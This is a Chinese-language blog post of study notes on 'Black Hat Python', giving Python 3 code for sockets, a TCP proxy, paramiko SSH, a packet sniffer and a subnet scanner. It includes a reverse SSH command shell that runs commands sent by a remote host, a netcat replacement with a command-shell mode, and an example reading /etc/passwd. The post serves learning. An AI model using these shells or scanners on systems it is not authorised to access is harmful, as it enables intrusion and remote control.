<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>blackhat python - network programming | 記事本</title>
<meta name=keywords content><meta name=description content="動機
來做個筆記吧
這裡有帶到基本的network programming與SSH的使用"><meta name=author content="zhengcf"><link rel=canonical href=https://littlebees.github.io/2020/09/blackhat-python-network-programming/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://littlebees.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://littlebees.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://littlebees.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://littlebees.github.io/apple-touch-icon.png><link rel=mask-icon href=https://littlebees.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://littlebees.github.io/2020/09/blackhat-python-network-programming/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="blackhat python - network programming"><meta property="og:description" content="動機
來做個筆記吧
這裡有帶到基本的network programming與SSH的使用"><meta property="og:type" content="article"><meta property="og:url" content="https://littlebees.github.io/2020/09/blackhat-python-network-programming/"><meta property="og:image" content="https://littlebees.github.io/images/papermod-cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-09-04T21:16:58+00:00"><meta property="article:modified_time" content="2020-09-04T21:16:58+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://littlebees.github.io/images/papermod-cover.png"><meta name=twitter:title content="blackhat python - network programming"><meta name=twitter:description content="動機
來做個筆記吧
這裡有帶到基本的network programming與SSH的使用"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://littlebees.github.io/posts/"},{"@type":"ListItem","position":2,"name":"blackhat python - network programming","item":"https://littlebees.github.io/2020/09/blackhat-python-network-programming/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"blackhat python - network programming","name":"blackhat python - network programming","description":"動機 來做個筆記吧\n這裡有帶到基本的network programming與SSH的使用\n","keywords":[],"articleBody":"動機 來做個筆記吧\n這裡有帶到基本的network programming與SSH的使用\n環境 \u0026 py3 書上的code是py2，同時code很舊，因此會用這個repo的code來解釋\n用WSL2測試\nCH2 基本的TCP client\u0026server tcp_client.py\nimport socket target_host = \"127.0.0.1\" target_port = 9999 # create a socket object client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # connect the client client.connect((target_host, target_port)) # NULL!!! # send some data client.send(b\"GET / HTTP/1.1\\r\\nHost: google.com\\r\\n\\r\\n\") # client.sendto(b\"AAABBBCCC\", (target_host, target_port)) # receive data response = client.recv(4096) print(response) UDP \u0026 TCP client的差別在\nsocket (創socket時) connect (與server建立連線，三段握手) send (送資料) UDP SOCK_STREAM 不用 sendto(data, tuple) TCP SOCK_DGRAM connect((target_host, target_port)) send(data) tcp_server.py\nimport socket import threading bind_ip = \"0.0.0.0\" bind_port = 9999 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((bind_ip, bind_port)) server.listen(5) print(\"[*] Listening on %s:%d\" % (bind_ip, bind_port)) # this is our client handling thread def handle_client(client_socket): # just print out what the client sends request = client_socket.recv(1024) print(\"[*] Received: %s\" % request) # send back a packet client_socket.send(b\"ACK!\") print(client_socket.getpeername()) client_socket.close() while True: client, addr = server.accept() print(\"[*] Accepted connection from: %s:%d\" % (addr[0], addr[1])) # spin up our client thread to handle incoming data client_handler = threading.Thread(target=handle_client, args=(client,)) client_handler.start() 這裡是用thread來處理每個進來的連線，之後會看到在同一個thread(就原本收連線的thread)處理每個進來的連線的手法(select,epool)\ntcp_proxy.py\nimport sys import socket import threading # this is a pretty hex dumping function directly taken from # http://code.activestate.com/recipes/142812-hex-dumper/ def hexdump(src, length=16): result = [] digits = 4 if isinstance(src, str) else 2 for i in range(0, len(src), length): s = src[i:i + length] hexa = b' '.join([b\"%0*X\" % (digits, ord(x)) for x in s]) text = b''.join([x if 0x20 \u003c= ord(x) \u003c 0x7F else b'.' for x in s]) result.append( b\"%04X %-*s %s\" % (i, length * (digits + 1), hexa, text)) print(b'\\n'.join(result)) def receive_from(connection): buffer = b'' # We set a 2 second time-out. Depending on your target this may need # to be adjusted connection.settimeout(2) try: # keep reading into the buffer until there's no more data or we # time-out while True: data = connection.recv(4096) if not data: break buffer += data except TimeoutError: pass return buffer # modify any requests destined for the remote host def request_handler(buffer): # perform packet modifications return buffer # modify any responses destined for the local host def response_handler(buffer): # perform packet modifications return buffer def proxy_handler(client_socket, remote_host, remote_port, receive_first): # connect to the remote host remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) remote_socket.connect((remote_host, remote_port)) # receive data from the remote end if necessary if receive_first: remote_buffer = receive_from(remote_socket) hexdump(remote_buffer) # send it to our response handler remote_buffer = response_handler(remote_buffer) # if we have data to send to our local client send it if len(remote_buffer): print(\"[\u003c==] Sending %d bytes to localhost.\" % len(remote_buffer)) client_socket.send(remote_buffer) # now let's loop and read from local, send to remote, send to local # rinse wash repeat while True: # read from local host local_buffer = receive_from(client_socket) if len(local_buffer): print(\"[==\u003e] Received %d bytes from localhost.\" % len(local_buffer)) hexdump(local_buffer) # send it to our request handler local_buffer = request_handler(local_buffer) # send off the data to the remote host remote_socket.send(local_buffer) print(\"[==\u003e] Sent to remote.\") # receive back the response remote_buffer = receive_from(remote_socket) if len(remote_buffer): print(\"[\u003c==] Received %d bytes from remote.\" % len(remote_buffer)) hexdump(remote_buffer) # send to our response handler remote_buffer = response_handler(remote_buffer) # send the response to the local socket client_socket.send(remote_buffer) print(\"[\u003c==] Sent to localhost.\") # if no more data on either side close the connections if not len(local_buffer) or not len(remote_buffer): client_socket.close() remote_socket.close() print(\"[*] No more data. Closing connections.\") break def server_loop(local_host, local_port, remote_host, remote_port, receive_first): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.bind((local_host, local_port)) except socket.error as exc: print(\"[!!] Failed to listen on %s:%d\" % (local_host, local_port)) print(\"[!!] Check for other listening sockets or correct \" \"permissions.\") print(f\"[!!] Caught exception error: {exc}\") sys.exit(0) print(\"[*] Listening on %s:%d\" % (local_host, local_port)) server.listen(5) while True: client_socket, addr = server.accept() # print out the local connection information print(\"[==\u003e] Received incoming connection from %s:%d\" % ( addr[0], addr[1])) # start a thread to talk to the remote host proxy_thread = threading.Thread(target=proxy_handler, args=( client_socket, remote_host, remote_port, receive_first)) proxy_thread.start() def main(): # no fancy command line parsing here if len(sys.argv[1:]) != 5: print(\"Usage: ./proxy.py [localhost] [localport] [remotehost] \" \"[remoteport] [receive_first]\") print(\"Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True\") sys.exit(0) # setup local listening parameters local_host = sys.argv[1] local_port = int(sys.argv[2]) # setup remote target remote_host = sys.argv[3] remote_port = int(sys.argv[4]) # this tells our proxy to connect and receive data # before sending to the remote host receive_first = sys.argv[5] if \"True\" in receive_first: receive_first = True else: receive_first = False # now spin up our listening socket server_loop(local_host, local_port, remote_host, remote_port, receive_first) main() proxy的邏輯: =...=\u003e是網路的部分，-...-\u003e是記憶體讀寫的部分。 開頭有大寫的是程式，開頭有底線是指令。\nClient =\u003e Proxy =\u003e Real_server 看得更細一點 Client = (proxy_ip,local_port) =\u003e ( _recv - write_buffer -\u003e _send - read_buffer -\u003e) = (server_ip,server_port) =\u003e Real_server 如果自己要玩的話，有個問題是他會先一直讀send的東西到write_buffer，但到什麼時候才要停止? 這尷尬的是client一直send卻沒有停下來的訊號，要做出這個訊號要利用shutdown 如下\n\u003e\u003e\u003e c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \u003e\u003e\u003e c.connect(('127.0.0.1',9988)) \u003e\u003e\u003e c.send(b'wow') 3 \u003e\u003e\u003e c.shutdown(socket.SHUT_WR) \u003e\u003e\u003e s = c.recv(4096) \u003e\u003e\u003e s b'ACK!' paramiko: 用python操作SSH 先啟動WSL2的sshd\n改/etc/ssh/sshd_config Port = 22 ListenAddress 0.0.0.0 PasswordAuthentication yes 重新啟動sshd dpkg-reconfigure openssh-server sudo service ssh restart ssh_command.py\nimport paramiko def ssh_command(ip, user, passwd, command): client = paramiko.SSHClient() # client can also support using key files # client.load_host_keys('/home/user/.ssh/known_hosts') client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect(ip, username=user, password=passwd) ssh_session = client.get_transport().open_session() if ssh_session.active: ssh_session.exec_command(command) print(ssh_session.recv(1024)) return ssh_command('127.0.0.1', 'justin', 'lovesthepython', 'ls -al') 連線的流程：\nSSHClient(new client) -\u003e connect [ip,(account, pw)] -\u003e get_transport -\u003e open_session 類比 socket (SOCK_STREAM) -\u003e connect((ip, port)) -\u003e [Nope] -\u003e accept bh_sshRcmd.py\nimport subprocess import paramiko def ssh_command(ip, user, passwd, command): client = paramiko.SSHClient() # client can also support using key files # client.load_host_keys('/home/user/.ssh/known_hosts') client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect(ip, username=user, password=passwd) ssh_session = client.get_transport().open_session() if ssh_session.active: ssh_session.send(command)# 這個其實可以不用 print(ssh_session.recv(1024)) # read banner ## === new === while True: # get the command from the SSH server command = ssh_session.recv(1024) try: cmd_output = subprocess.check_output(command, shell=True) ssh_session.send(cmd_output) except Exception as e: ssh_session.send(str(e)) ## === new end === client.close() return ssh_command('192.168.100.130', 'justin', 'lovesthepython', 'ClientConnected') 現在是在bh_sshRcmd.py執行指令再塞回去，這邊就是reverse tunnel的fu 不過這要能運作要配合下面的code\nbh_sshserver.py\nimport socket import paramiko import threading import sys # using the server host key from the paramiko demo files host_key = paramiko.RSAKey(filename='test_rsa.key') class Server(paramiko.ServerInterface): def __init__(self): self.event = threading.Event() def check_channel_request(self, kind, chanid): if kind == 'session': return paramiko.OPEN_SUCCEEDED return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED def check_auth_password(self, username, password): if username == 'root' and password == 'toor': return paramiko.AUTH_SUCCESSFUL return paramiko.AUTH_FAILED server = sys.argv[1] ssh_port = int(sys.argv[2]) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((server, ssh_port)) sock.listen(100) print(\"[+] Listening for connection...\") client, addr = sock.accept() except Exception as e: print(\"[-] Listen failed: \" + str(e)) sys.exit(1) print(\"[+] Got a connection!\") try: # noinspection PyTypeChecker bhSession = paramiko.Transport(client) bhSession.add_server_key(host_key) server = Server() try: bhSession.start_server(server=server) except paramiko.SSHException: print(\"[-] SSH negotiation failed.\") chan = bhSession.accept(20) print(\"[+] Authenticated!\") print(chan.recv(1024)) # 這段其實不用 chan.send(\"Welcome to bh_ssh!\") while True: try: command = input(\"Enter command: \").strip(\"\\n\") if command != \"exit\": chan.send(command) print(chan.recv(1024).decode(errors=\"ignore\") + \"\\n\") else: chan.send(\"exit\") print(\"Exiting...\") bhSession.close() raise Exception(\"exit\") except KeyboardInterrupt: bhSession.close() except Exception as e: print(\"[-] Caught exception: \" + str(e)) bhSession.close() finally: sys.exit(1) 大概的流程是\nclient連到server server丟指令到client client跑指令回傳結果 這邊就是自幹reverse tunnel\n下面就是包好的版本 要注意到因為目的是relay sshd的東西到server 所以剛剛例子是跑指令的部分變成proxy的code\nrforward.py\n#!/usr/bin/env python # Copyright (C) 2008 Robey Pointer # # This file is part of paramiko. # # Paramiko is free software; you can redistribute it and/or modify it under the # terms of the GNU Lesser General Public License as published by the Free # Software Foundation; either version 2.1 of the License, or (at your option) # any later version. # # Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY # WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR # A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more # details. # # You should have received a copy of the GNU Lesser General Public License # along with Paramiko; if not, write to the Free Software Foundation, Inc., # 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA. \"\"\" Sample script showing how to do remote port forwarding over paramiko. This script connects to the requested SSH server and sets up remote port forwarding (the openssh -R option) from a remote port through a tunneled connection to a destination reachable from the local machine. \"\"\" import getpass import socket import select import sys import threading from optparse import OptionParser import paramiko SSH_PORT = 22 DEFAULT_PORT = 4000 g_verbose = True def handler(chan, host, port): sock = socket.socket() try: sock.connect((host, port)) # 與剛剛的例子對比，原本是在這裡跑指令，不過這邊是連到另一台server except Exception as e: verbose(\"Forwarding request to %s:%d failed: %r\" % (host, port, e)) return verbose( \"Connected! Tunnel open %r -\u003e %r -\u003e %r\" % (chan.origin_addr, chan.getpeername(), (host, port)) ) while True: # chan(sshd) \u003c-\u003e sock(real server) r, w, x = select.select([sock, chan], [], []) if sock in r: data = sock.recv(1024) if len(data) == 0: break chan.send(data) if chan in r: data = chan.recv(1024) if len(data) == 0: break sock.send(data) chan.close() sock.close() verbose(\"Tunnel closed from %r\" % (chan.origin_addr,)) def reverse_forward_tunnel(server_port, remote_host, remote_port, transport): transport.request_port_forward(\"\", server_port) # bind(\"0.0.0.0\", server_port) while True: chan = transport.accept(1000) # accept 來自sshd的連線 if chan is None: continue thr = threading.Thread( target=handler, args=(chan, remote_host, remote_port) ) thr.setDaemon(True) thr.start() def verbose(s): if g_verbose: print(s) HELP = \"\"\"\\ Set up a reverse forwarding tunnel across an SSH server, using paramiko. A port on the SSH server (given with -p) is forwarded across an SSH session back to the local machine, and out to a remote site reachable from this network. This is similar to the openssh -R option. \"\"\" def get_host_port(spec, default_port): \"\"\"parse 'hostname:22' into a host and port, with the port optional\"\"\" args = (spec.split(\":\", 1) + [default_port])[:2] args[1] = int(args[1]) return args[0], args[1] def parse_options(): global g_verbose parser = OptionParser( usage=\"usage: %prog [options] [:]\", version=\"%prog 1.0\", description=HELP, ) parser.add_option( \"-q\", \"--quiet\", action=\"store_false\", dest=\"verbose\", default=True, help=\"squelch all informational output\", ) parser.add_option( \"-p\", \"--remote-port\", action=\"store\", type=\"int\", dest=\"port\", default=DEFAULT_PORT, help=\"port on server to forward (default: %d)\" % DEFAULT_PORT, ) parser.add_option( \"-u\", \"--user\", action=\"store\", type=\"string\", dest=\"user\", default=getpass.getuser(), help=\"username for SSH authentication (default: %s)\" % getpass.getuser(), ) parser.add_option( \"-K\", \"--key\", action=\"store\", type=\"string\", dest=\"keyfile\", default=None, help=\"private key file to use for SSH authentication\", ) parser.add_option( \"\", \"--no-key\", action=\"store_false\", dest=\"look_for_keys\", default=True, help=\"don't look for or use a private key file\", ) parser.add_option( \"-P\", \"--password\", action=\"store_true\", dest=\"readpass\", default=False, help=\"read password (for key or password auth) from stdin\", ) parser.add_option( \"-r\", \"--remote\", action=\"store\", type=\"string\", dest=\"remote\", default=None, metavar=\"host:port\", help=\"remote host and port to forward to\", ) options, args = parser.parse_args() if len(args) != 1: parser.error(\"Incorrect number of arguments.\") if options.remote is None: parser.error(\"Remote address required (-r).\") g_verbose = options.verbose server_host, server_port = get_host_port(args[0], SSH_PORT) remote_host, remote_port = get_host_port(options.remote, SSH_PORT) return options, (server_host, server_port), (remote_host, remote_port) def main(): options, server, remote = parse_options() password = None if options.readpass: password = getpass.getpass(\"Enter SSH password: \") client = paramiko.SSHClient() client.load_system_host_keys() client.set_missing_host_key_policy(paramiko.WarningPolicy()) verbose(\"Connecting to ssh host %s:%d ...\" % (server[0], server[1])) try: client.connect( server[0], server[1], username=options.user, key_filename=options.keyfile, look_for_keys=options.look_for_keys, password=password, ) except Exception as e: print(\"*** Failed to connect to %s:%d: %r\" % (server[0], server[1], e)) sys.exit(1) verbose( \"Now forwarding remote port %d to %s:%d ...\" % (options.port, remote[0], remote[1]) ) try: reverse_forward_tunnel( options.port, remote[0], remote[1], client.get_transport() ) except KeyboardInterrupt: print(\"C-c: Port forwarding stopped.\") sys.exit(0) if __name__ == \"__main__\": main() 總複習: Netcat Replacement bhnet.py\nimport sys import socket import getopt import threading import subprocess # define some global variables listen = False command = False upload = False execute = \"\" target = \"\" upload_destination = \"\" port = 0 # this runs a command and returns the output def run_command(cmd): # trim the newline cmd = cmd.rstrip() # run the command and get the output back try: output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) except subprocess.CalledProcessError as e: output = e.output # send the output back to the client return output # this handles incoming client connections def client_handler(client_socket): global upload global execute global command # check for upload if len(upload_destination): # read in all of the bytes and write to our destination file_buffer = \"\" # keep reading data until none is available while True: data = client_socket.recv(1024) if not data: break else: file_buffer += data # now we take these bytes and try to write them out try: file_descriptor = open(upload_destination, \"wb\") file_descriptor.write(file_buffer.encode('utf-8')) file_descriptor.close() # acknowledge that we wrote the file out client_socket.send( \"Successfully saved file to %s\\r\\n\" % upload_destination) except OSError: client_socket.send( \"Failed to save file to %s\\r\\n\" % upload_destination) # check for command execution if len(execute): # run the command output = run_command(execute) client_socket.send(output) # now we go into another loop if a command shell was requested if command: while True: # show a simple prompt client_socket.send(\" \".encode('utf-8')) # now we receive until we see a linefeed (enter key) cmd_buffer = b'' while b\"\\n\" not in cmd_buffer: cmd_buffer += client_socket.recv(1024) # we have a valid command so execute it and send back the results response = run_command(cmd_buffer) # send back the response client_socket.send(response) # this is for incoming connections def server_loop(): global target global port # if no target is defined we listen on all interfaces if not len(target): target = \"0.0.0.0\" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((target, port)) server.listen(5) while True: client_socket, addr = server.accept() # spin off a thread to handle our new client client_thread = threading.Thread(target=client_handler, args=(client_socket,)) client_thread.start() # if we don't listen we are a client... make it so. def client_sender(buffer): client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: # connect to our target host client.connect((target, port)) # if we detect input from stdin send it # if not we are going to wait for the user to punch some in if len(buffer): client.send(buffer.encode('utf-8')) while True: # now wait for data back recv_len = 1 response = b'' while recv_len: data = client.recv(4096) recv_len = len(data) response += data if recv_len \u003c 4096: break print(response.decode('utf-8'), end=' ') # wait for more input buffer = input(\"\") buffer += \"\\n\" # send it off client.send(buffer.encode('utf-8')) except socket.error as exc: # just catch generic errors - you can do your homework to beef this up print(\"[*] Exception! Exiting.\") print(f\"[*] Caught exception socket.error: {exc}\") # teardown the connection client.close() def usage(): print(\"Netcat Replacement\") print() print(\"Usage: bhpnet.py -t target_host -p port\") print( \"-l --listen - listen on [host]:[port] for incoming \" \"connections\") print( \"-e --execute=file_to_run - execute the given file upon receiving \" \"a connection\") print(\"-c --command - initialize a command shell\") print( \"-u --upload=destination - upon receiving connection upload a file \" \"and write to [destination]\") print() print() print(\"Examples: \") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -c\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\") print(\"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\"cat /etc/passwd\\\"\") print(\"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135\") sys.exit(0) def main(): global listen global port global execute global command global upload_destination global target if not len(sys.argv[1:]): usage() # read the commandline options try: opts, args = getopt.getopt(sys.argv[1:], \"hle:t:p:cu:\", [\"help\", \"listen\", \"execute\", \"target\", \"port\", \"command\", \"upload\"]) for o, a in opts: if o in (\"-h\", \"--help\"): usage() elif o in (\"-l\", \"--listen\"): listen = True elif o in (\"-e\", \"--execute\"): execute = a elif o in (\"-c\", \"--commandshell\"): command = True elif o in (\"-u\", \"--upload\"): upload_destination = a elif o in (\"-t\", \"--target\"): target = a elif o in (\"-p\", \"--port\"): port = int(a) else: assert False, \"Unhandled Option\" except getopt.GetoptError as err: print(str(err)) usage() # are we going to listen or just send data from STDIN? if not listen and len(target) and port \u003e 0: # read in the buffer from the commandline # this will block, so send CTRL-D if not sending input # to stdin buffer = sys.stdin.read() # send data off client_sender(buffer) # we are going to listen and potentially # upload things, execute commands and drop a shell back # depending on our command line options above if listen: server_loop() main() 就是proxy + run_command + server + client的集大成(不包含SSH) 作為netcat(nc)的替代品\nCH3 這章就是介紹raw socket，沒有第四層的socket\nsniffer_basic.py\nimport socket import os # host to listen on host = \"192.168.0.196\" # create a raw socket and bind it to the public interface if os.name == \"nt\": socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # 沒有第四層，就不用port # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we're on Windows we need to send an IOCTL # to setup promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) # read in a single packet print(sniffer.recvfrom(65535)) # if we're on Windows turn off promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 設定一個socket接收所有packet，但收到的資料都是byte，要依據protocol的規定轉成對應的datatype\nsniffer_ip_header_decode.py\nimport socket import os import struct from ctypes import * # host to listen on host = \"192.168.0.187\" class IP(Structure): _fields_ = [ (\"ihl\", c_ubyte, 4), (\"version\", c_ubyte, 4), (\"tos\", c_ubyte), (\"len\", c_ushort), (\"id\", c_ushort), (\"offset\", c_ushort), (\"ttl\", c_ubyte), (\"protocol_num\", c_ubyte), (\"sum\", c_ushort), (\"src\", c_uint32), (\"dst\", c_uint32) ] def __new__(cls, socket_buffer=None): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer=None): self.socket_buffer = socket_buffer # map protocol constants to their names self.protocol_map = {1: \"ICMP\", 6: \"TCP\", 17: \"UDP\"} # human readable IP addresses self.src_address = socket.inet_ntoa(struct.pack(\"@I\", self.src)) self.dst_address = socket.inet_ntoa(struct.pack(\"@I\", self.dst)) # human readable protocol try: self.protocol = self.protocol_map[self.protocol_num] except IndexError: self.protocol = str(self.protocol_num) # create a raw socket and bind it to the public interface if os.name == \"nt\": socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we're on Windows we need to send some ioctl # to setup promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) try: while True: # read in a single packet raw_buffer = sniffer.recvfrom(65535)[0] # create an IP header from the first 20 bytes of the buffer ip_header = IP(raw_buffer[:20]) print(\"Protocol: %s %s -\u003e %s\" % ( ip_header.protocol, ip_header.src_address, ip_header.dst_address) ) except KeyboardInterrupt: # if we're on Windows turn off promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 這很像把水用成造型冰塊一樣，把byte依據field的規定來找出我們需要的資訊 sniffer_with_icmp.py\nimport socket import os import struct from ctypes import * # host to listen on host = \"192.168.0.187\" class IP(Structure): _fields_ = [ (\"ihl\", c_ubyte, 4), # c_ubyte的前4個bits (\"version\", c_ubyte, 4), # c_ubyte的後4個bits (\"tos\", c_ubyte), (\"len\", c_ushort), (\"id\", c_ushort), (\"offset\", c_ushort), (\"ttl\", c_ubyte), (\"protocol_num\", c_ubyte), (\"sum\", c_ushort), (\"src\", c_uint32), (\"dst\", c_uint32) ] def __new__(cls, socket_buffer=None): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer=None): self.socket_buffer = socket_buffer # map protocol constants to their names self.protocol_map = {1: \"ICMP\", 6: \"TCP\", 17: \"UDP\"} # human readable IP addresses self.src_address = socket.inet_ntoa(struct.pack(\"@I\", self.src)) self.dst_address = socket.inet_ntoa(struct.pack(\"@I\", self.dst)) # human readable protocol try: self.protocol = self.protocol_map[self.protocol_num] except IndexError: self.protocol = str(self.protocol_num) class ICMP(Structure): _fields_ = [ (\"type\", c_ubyte), (\"code\", c_ubyte), (\"checksum\", c_ushort), (\"unused\", c_ushort), (\"next_hop_mtu\", c_ushort) ] def __new__(cls, socket_buffer): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer): self.socket_buffer = socket_buffer # create a raw socket and bind it to the public interface if os.name == \"nt\": socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we're on Windows we need to send some ioctl # to setup promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) try: while True: # read in a single packet raw_buffer = sniffer.recvfrom(65535)[0] # create an IP header from the first 20 bytes of the buffer ip_header = IP(raw_buffer[:20]) print(\"Protocol: %s %s -\u003e %s\" % ( ip_header.protocol, ip_header.src_address, ip_header.dst_address) ) # if it's ICMP we want it if ip_header.protocol == \"ICMP\": # calculate where our ICMP packet starts offset = ip_header.ihl * 4 buf = raw_buffer[offset:offset + sizeof(ICMP)] # create our ICMP structure icmp_header = ICMP(buf) print(\"ICMP -\u003e Type: %d Code: %d\" % ( icmp_header.type, icmp_header.code) ) # handle CTRL-C except KeyboardInterrupt: # if we're on Windows turn off promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) ICMP是(IP (ICMP ...))的包裝 但都byte要怎麼區分哪裡是IP還是ICMP的byte?\n因此IP要知道自己有多長(ip_header.ihl * 4，乘4是因為ihl的單位是4bytes)，這樣就可以知道ICMP從哪邊開始\nscanner.py\nimport socket import os import struct import threading from ipaddress import ip_address, ip_network from ctypes import * # host to listen on host = \"192.168.0.187\" # subnet to target tgt_subnet = \"192.168.0.0/24\" # magic we'll check ICMP responses for tgt_message = \"PYTHONRULES!\" def udp_sender(sub_net, magic_message): sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for ip in ip_network(sub_net).hosts(): sender.sendto(magic_message.encode('utf-8'), (str(ip), 65212)) class IP(Structure): _fields_ = [ (\"ihl\", c_ubyte, 4), (\"version\", c_ubyte, 4), (\"tos\", c_ubyte), (\"len\", c_ushort), (\"id\", c_ushort), (\"offset\", c_ushort), (\"ttl\", c_ubyte), (\"protocol_num\", c_ubyte), (\"sum\", c_ushort), (\"src\", c_uint32), (\"dst\", c_uint32) ] def __new__(cls, socket_buffer=None): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer=None): self.socket_buffer = socket_buffer # map protocol constants to their names self.protocol_map = {1: \"ICMP\", 6: \"TCP\", 17: \"UDP\"} # human readable IP addresses self.src_address = socket.inet_ntoa(struct.pack(\"@I\", self.src)) self.dst_address = socket.inet_ntoa(struct.pack(\"@I\", self.dst)) # human readable protocol try: self.protocol = self.protocol_map[self.protocol_num] except IndexError: self.protocol = str(self.protocol_num) class ICMP(Structure): _fields_ = [ (\"type\", c_ubyte), (\"code\", c_ubyte), (\"checksum\", c_ushort), (\"unused\", c_ushort), (\"next_hop_mtu\", c_ushort) ] def __new__(cls, socket_buffer): return cls.from_buffer_copy(socket_buffer) def __init__(self, socket_buffer): self.socket_buffer = socket_buffer # create a raw socket and bind it to the public interface if os.name == \"nt\": socket_protocol = socket.IPPROTO_IP else: socket_protocol = socket.IPPROTO_ICMP sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) sniffer.bind((host, 0)) # we want the IP headers included in the capture sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) # if we're on Windows we need to send some ioctl # to setup promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) # start sending packets t = threading.Thread(target=udp_sender, args=(tgt_subnet, tgt_message)) t.start() try: while True: # read in a single packet raw_buffer = sniffer.recvfrom(65535)[0] # create an IP header from the first 20 bytes of the buffer ip_header = IP(raw_buffer[:20]) print(\"Protocol: %s %s -\u003e %s\" % ( ip_header.protocol, ip_header.src_address, ip_header.dst_address) ) # if it's ICMP we want it if ip_header.protocol == \"ICMP\": # calculate where our ICMP packet starts offset = ip_header.ihl * 4 buf = raw_buffer[offset:offset + sizeof(ICMP)] # create our ICMP structure icmp_header = ICMP(buf) print(\"ICMP -\u003e Type: %d Code: %d\" % ( icmp_header.type, icmp_header.code) ) # now check for the TYPE 3 and CODE 3 which indicates # a host is up but no port available to talk to if icmp_header.code == 3 and icmp_header.type == 3: # check to make sure we are receiving the response # that lands in our subnet if ip_address(ip_header.src_address) in ip_network(tgt_subnet): # test for our magic message if raw_buffer[len(raw_buffer) - len(tgt_message):] == tgt_message: print(\"Host Up: %s\" % ip_header.src_address) # handle CTRL-C except KeyboardInterrupt: # if we're on Windows turn off promiscuous mode if os.name == \"nt\": sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) 